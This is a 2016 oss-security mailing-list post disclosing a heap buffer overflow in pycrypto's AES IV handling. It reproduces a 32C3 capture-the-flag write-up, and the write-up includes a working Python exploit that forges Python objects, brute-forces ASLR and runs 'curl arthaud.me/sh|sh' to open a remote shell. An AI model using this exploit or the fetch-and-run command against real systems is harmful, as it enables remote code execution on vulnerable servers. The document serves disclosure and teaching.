@@ -1,0 +1,226 @@
+
+Date: Mon, 26 Dec 2016 20:09:25 -0500
+From: Leo Famulari <leo@...ulari.name>
+To: oss-security <oss-security@...ts.openwall.com>
+Subject: Buffer overflow in pycrypto
+
+I noticed this bug report in the pycrypto bug tracker:
+
+"AES.new with invalid parameter crashes python"
+https://github.com/dlitz/pycrypto/issues/176
+
+The original report, from that GitHub page:
+------
+In Crypto 2.6.1 and Python 2.7.10 and 3.4.3
+folowing code causes crash:
+
+from Crypto.Cipher import AES
+
+AES.new(b'\000' * 16, AES.MODE_ECB, b'\000' * 540)
+------
+
+Apparently this issue is fixed on pycrypto's development branch with
+commit 8dbe0dc3eea5c689d4f76b37b93fe216cf1f00d4, but this change can't
+be applied directly to the latest pycrypto release tarball; too much has
+changed.
+
+https://github.com/dlitz/pycrypto/commit/8dbe0dc3eea5c689d4f76b37b93fe216cf1f00d4
+
+Linked from the pycrypto bug #176 discussion, someone has used the bug
+to get a remote shell. This report is reproduced in the remainder of
+this message:
+
+https://pony7.fr/ctf:public:32c3:cryptmsg
+
+cryptmsg - Writeup by Maxima
+Challenge
+
+Can you find the bug?
+
+http://136.243.194.56:8000/
+Solution
+
+The website allows us to encrypt and decrypt messages using AES. The
+encryption is performed by cryptmsg.py, using the python library
+pycrypto. After a few searches, I found out that there was a bug in
+pycrypto: https://github.com/dlitz/pycrypto/issues/176. We can use this
+vulnerability to get a shell.
+
+I first tried to guess the architecture on the server. I managed to get
+it by causing a python stacktrace:
+
+curl "http://136.243.194.56:8000/cgi-bin/cryptmsg.py?what=enc&msg=AAAAAAAAAAAAAAAA&key=AAAAAAAAAAAAAAAA&mode=42&iv=AAAAAAAAAAAAAAAA"
+
+In the stacktrace, the path to the shared object is
+/usr/lib/pyth…t-packages/Crypto/Cipher/_AES.i386-linux-gnu.so, se we
+know that the architecture is i386 (x86 32bits). I also assumed that the
+server runs on Ubuntu Server 15.10, since that was what they were
+running on some of their other challenge servers. I quickly set up a
+virtual machine to have the same environment.
+
+Then I dove more deeply in the source code. Here is the code in
+src/block_templace.c in pycrypto source code:
+
+static ALGobject *
+ALGnew(PyObject *self, PyObject *args, PyObject *kwdict)
+{
+	unsigned char *key, *IV;
+	ALGobject * new=NULL;
+	int keylen, IVlen=0, mode=MODE_ECB, segment_size=0;
+	PyObject *counter = NULL;
+	int counter_shortcut = 0;
+ 
+        // [...]
+ 
+	/* Set default values */
+	if (!PyArg_ParseTupleAndKeywords(args, kwdict, "s#|is#Oi",
+					 kwlist,
+					 &key, &keylen, &mode, &IV, &IVlen,
+					 &counter, &segment_size)) 
+	{
+		return NULL;
+	}
+ 
+	// [...]
+        new = newALGobject();
+        // [...]
+ 
+	memset(new->IV, 0, BLOCK_SIZE);
+	memset(new->oldCipher, 0, BLOCK_SIZE);
+	memcpy(new->IV, IV, IVlen); // buffer overflow!
+	new->mode = mode;
+	new->count=BLOCK_SIZE;   /* stores how many bytes in new->oldCipher have been used */
+	return new;
+}
+
+And here is the ALGobject structure:
+
+#define BLOCK_SIZE 16
+ 
+typedef struct 
+{
+	PyObject_HEAD 
+	int mode, count, segment_size;
+	unsigned char IV[BLOCK_SIZE], oldCipher[BLOCK_SIZE];
+	PyObject *counter;
+	int counter_shortcut;
+	block_state st;
+} ALGobject;
+
+Thus there is a heap buffer overflow on IV. We can basically write as
+many bytes as we want on a part of the heap.
+
+The next step is to get the control of the execution flow. The idea is
+to overwrite the counter pointer to introduce a fake python object. Here
+is what a python object structure looks like:
+
+typedef struct _object {
+    Py_ssize_t ob_refcnt;
+    struct _typeobject *ob_type;
+} PyObject;
+
+The first element is the reference counter on this object. The second
+element is a pointer on the type of the object. Here is the type
+structure:
+
+typedef struct _typeobject {  
+    Py_ssize_t ob_refcnt;
+    struct _typeobject *ob_type;
+    Py_ssize_t ob_size; /* Number of items in variable part */
+ 
+    const char *tp_name; /* For printing, in format "<module>.<name>" */
+    Py_ssize_t tp_basicsize, tp_itemsize; /* For allocation */
+ 
+    /* Methods to implement standard operations */
+ 
+    destructor tp_dealloc;
+    printfunc tp_print;
+    getattrfunc tp_getattr;
+    setattrfunc tp_setattr;
+    cmpfunc tp_compare;
+    reprfunc tp_repr;
+ 
+    // [...]
+} PyTypeObject;
+
+We are going to create a fake object associated to a fake type. When the
+object gets deallocated, the function pointer tp_dealloc will be used.
+In the fake type, we will put a pointer on a gadget to get a shell.
+Fortunately, system() is available in the PLT.
+
+I found a nice gadget in the python binary, using ropper:
+
+   0x81580d6:	push   edx
+   0x81580d7:	call   DWORD PTR [eax+0x18]
+
+When the object is deallocated, edx contains the address of the type,
+and eax contains the address of the object. We can create a fake object
+and a fake type that will execute a command:
+
+def p(v):
+    return struct.pack('<I', v)
+ 
+fake_object = p(1) # ref counter
+fake_object += p(fake_type_addr) # type object
+fake_object += b'\x00' * 16
+fake_object += p(system_addr)
+ 
+fake_type = cmd.ljust(24, b'\x00')
+fake_type += p(call_gadget)
+
+Here, call_gadget = 0x81580d6 and system_addr = 0x0805a2f0 (you can get
+them easily using gdb). The problem is that we don't know yet where our
+fake_object and fake_type will be because of ASLR. The heap is mapped to
+a random address. Because the server runs on a 32bits architecture, we
+know that we can bruteforce it. We will put our fake_object and
+fake_type a lot of times in the memory, and use for fake_object_addr a
+potential address right in the middle of the heap.
+
+I will execute the command curl arthaud.me/sh|sh that'll give me a
+shell. Here is my final script:
+
+#!/usr/bin/env python3
+import struct
+import requests
+ 
+ 
+def p(v):
+    return struct.pack('<I', v)
+ 
+cmd = b'curl arthaud.me/sh|sh\x00'
+ 
+system_addr = 0x0805a2f0
+call_gadget = 0x81580d6 # push edx; call [eax + 0x18]
+fake_object_addr = 0x84d673c
+fake_type_addr = fake_object_addr + 0x1c
+ 
+fake_object = p(1) # ref counter
+fake_object += p(fake_type_addr) # type object
+fake_object += b'\x00' * 16
+fake_object += p(system_addr)
+ 
+assert len(cmd) <= 24
+fake_type = cmd.ljust(24, b'\x00')
+fake_type += p(call_gadget)
+ 
+payload = b'I' * 32
+payload += p(fake_object_addr)
+ 
+data = (fake_object + fake_type) * 500
+ 
+qs = 'key=' + 'A' * 16
+qs += '&mode=1'
+qs += '&iv=' + ''.join('%%%02x' % c for c in payload)
+qs += '&x=' + ''.join('%%%02x' % c for c in data)
+ 
+i = 1
+while True:
+    print('\rAttempt %d' % i, end='')
+    i += 1
+    requests.get('http://136.243.194.56:8000/cgi-bin/cryptmsg.py?%s' % qs)
+
+You can also use Ricky Zhou exploit.
+
+After a few hours, I finally got a shell!
+
+Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
